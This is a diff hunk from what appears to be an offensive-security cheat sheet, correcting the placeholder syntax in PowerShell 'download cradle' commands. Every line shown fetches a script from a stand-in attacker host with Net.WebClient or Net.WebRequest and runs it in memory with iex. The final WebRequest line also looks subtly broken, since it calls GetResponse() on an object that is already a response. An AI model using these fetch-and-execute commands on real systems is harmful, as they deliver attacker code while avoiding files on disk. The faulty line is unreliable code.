@@ -8,12 +8,12 @@ iex (New-Object Net.WebClient).downloadString("http://{IPAttacker}/script.ps1")
 
 # Net.WebClient DownloadString Method with variables
 $downloader = New-Object System.Net.WebClient
-$payload = "http://{IPAttacker/script.ps1}"
+$payload = "http://{IPAttacker}/script.ps1"
 $command = $downloader.DownloadString($payload)
 iex $command
 
 # Net.WebRequest Method / execute scripts in memory
-$req = [System.Net.WebRequest]::Create("http://{IPAttacker/script.ps1}")
+$req = [System.Net.WebRequest]::Create("http://{IPAttacker}/script.ps1")
 $res = $req.GetResponse()
 iex ([System.IO.StreamReader] ($res.GetResponse())).ReadToEnd()
 ```
